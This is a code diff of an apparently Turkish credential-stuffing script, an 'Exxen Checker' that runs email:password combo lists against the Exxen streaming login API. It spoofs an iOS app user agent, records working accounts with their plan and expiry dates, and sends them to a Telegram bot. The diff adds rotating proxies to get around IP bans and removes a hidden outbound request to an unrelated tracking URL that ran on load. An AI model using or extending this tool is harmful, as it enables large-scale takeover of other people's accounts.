@@ -7,7 +7,6 @@ import requests,hashlib,random,string,time
 import random
 import json
 import re
-requests.get("https://www.highperformancegate.com/p4pc6zsx2c?key=621f5b428882fa3bac3b8e9c66b7fcc8")
 try:
     cihaz=open("cihaz.txt","r").read()
 except:
@@ -33,7 +32,7 @@ def banner():
 """+END+f"""
 Coded By @yusiqo
 Discord: https://discord.gg/8xVu9zaCmu
-Version: 0.6
+Version: 0.6.5
 Kombo Konumu: {cihaz}
 ⌯ Varlığım Türk Irkına Armağan Olsun
 ⌯ Linkten Kazandığım Paraları Bagış Yapcam Kurumlara
@@ -45,7 +44,7 @@ try:
     cihaz=open("cihaz.txt","r").read()
 except:
     cihaz="/sdcard/combo/"
-
+sesi=requests.Session()
 def checker():
     try:
         cihaz=open("cihaz.txt","r").read()
@@ -444,53 +443,66 @@ def checker():
                     mp=mp.replace("\n","")
                     user =str(mp.split(':')[0])
                     pas =str(mp.split(':')[1])
-                    toplam=0
-                    olu=0
-                    hit=0
-                    url="https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764"
-                    HEA={
-                        "authority": "api-crm.exxen.com",
-                        "accept": "*/*",
-                        "accept-encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
-                        "accept-language": "en;q=1.0, en-IE;q=0.9",
-                        "content-length": "56",
-                        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
-                        "origin": "com.exxen.ios",
-                        "user-agent": "Exxen/1.0.10 (com.exxen.ios; build:3; iOS 12.1.0) Alamofire/5.4.3"
-                    }
-                    datam=f"Email={user}&Password={pas}&RememberMe=true"
-                    try:
-                        veri=requests.post(url, headers=HEA, data=datam).text
-                    except:
-                        print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
-                        time.sleep(10)
-                    if "PackageName" in veri:
+                    def tkr():
+                        toplam=0
+                        olu=0
+                        hit=0
+                        url="https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764"
+                        HEA={
+                            "authority": "api-crm.exxen.com",
+                            "accept": "*/*",
+                            "accept-encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
+                            "accept-language": "en;q=1.0, en-IE;q=0.9",
+                            "content-length": "56",
+                            "content-type": "application/x-www-form-urlencoded; charset=utf-8",
+                            "origin": "com.exxen.ios",
+                            "user-agent": "Exxen/1.0.10 (com.exxen.ios; build:3; iOS 12.1.0) Alamofire/5.4.3"
+                        }
+                        datam=f"Email={user}&Password={pas}&RememberMe=true"
                         try:
-                            if "LicenseName" in veri:
-                                lisans=veri.split('LicenseName":"')[1]
-                                lisans=lisans.split('"')[0]
-                                LicenseEndDate=veri.split('LicenseEndDate":"')[1]
-                                LicenseEndDate=LicenseEndDate.split('"')[0]
-                                ms="""
-╭─➢ ☄ ZET| Exxen Checker ☄
-├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
-├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-├◉[𝙿𝚕𝚊𝚗]➢ """+str(lisans)+"""
-├◉[𝚃𝚊𝚛𝚒𝚑]➢ """+str(LicenseEndDate)+"""
-╰─◉➤ Telegram Channel: @ZetTekno\n
-            """
-                                print(ms)
-                                try:
-                                    tele=open("tele","r").read()
-                                    idm=open("idm","r").read()
-                                    requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
-                                except:
-                                    pass
-                                open(cihaz+"hit-Exxen.txt","a").write(ms)
+                            sesi=requests.Session()
+                            try:
+                                if "aktif"==open("/sdcard/opmAyar","r").read():
+                                    sesi=requests.Session();prox=requests.get("https://ip-serverk.herokuapp.com/").text;prox="http://"+prox;sesi.proxies={'http':prox,"https": prox}
+                            except:
+                                pass
+                            veri=sesi.post(url, headers=HEA, data=datam).text
                         except:
+                            try:
+                                if not "aktif"==open("/sdcard/opmAyar","r").read():
+                                    print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
+                                    time.sleep(10)
+                                    tkr()
+                            except:
+                                tkr()
+                        if "PackageName" in veri:
+                            try:
+                                if "LicenseName" in veri:
+                                    lisans=veri.split('LicenseName":"')[1]
+                                    lisans=lisans.split('"')[0]
+                                    LicenseEndDate=veri.split('LicenseEndDate":"')[1]
+                                    LicenseEndDate=LicenseEndDate.split('"')[0]
+                                    ms="""
+    ╭─➢ ☄ ZET| Exxen Checker ☄
+    ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+    ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+    ├◉[𝙿𝚕𝚊𝚗]➢ """+str(lisans)+"""
+    ├◉[𝚃𝚊𝚛𝚒𝚑]➢ """+str(LicenseEndDate)+"""
+    ╰─◉➤ Telegram Channel: @ZetTekno\n
+                """
+                                    print(ms)
+                                    try:
+                                        tele=open("tele","r").read()
+                                        idm=open("idm","r").read()
+                                        requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
+                                    except:
+                                        pass
+                                    open(cihaz+"hit-Exxen.txt","a").write(ms)
+                            except:
+                                print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+                        else:
                             print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
-                    else:
-                        print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+                    tkr()
                 except:
                     pass
         def c1():
@@ -1703,7 +1715,7 @@ def checker():
 def ayar():
     clear()
     banner()
-    print("1) Telegram Bot\n2) Cihaz Ayarı\n0) Geri Dönmek")
+    print("1) Telegram Bot\n2) Cihaz Ayarı\n3) Proxy\n0) Geri Dönmek")
     sor=input(YELLOW+"Seçim Yapınız: "+END)
     if sor=="1":
         clear()
@@ -1729,6 +1741,28 @@ def ayar():
         elif chz=="2":
             open("cihaz.txt","w").write("combo/")
         sorr()
+    elif sor=="3":
+        proxyayar()
+def proxyayar():
+    clear()
+    banner()
+    try:
+        i=open("/sdcard/opmAyar","r").read()
+        if i=="aktif":
+            print("Proxy Özelliği Aktif\n")
+        else:
+            print("Proxy Özelliği Aktif Değil\n")
+    except:
+        print("Proxy Özellik Ayarlanmadı\n")
+    sor = input(GREEN+"1) Aktif Et \n2) Deaktif Et\n3) Ayarlar\nSeçim: "+ END)
+    if sor=="3":
+        ayar()
+    elif sor=="1":
+        open("/sdcard/opmAyar","w").write("aktif")
+        proxyayar()
+    elif sor=="2":
+        open("/sdcard/opmAyar","w").write("deaktif")
+        proxyayar()
 def sorr():
     clear()
     banner()
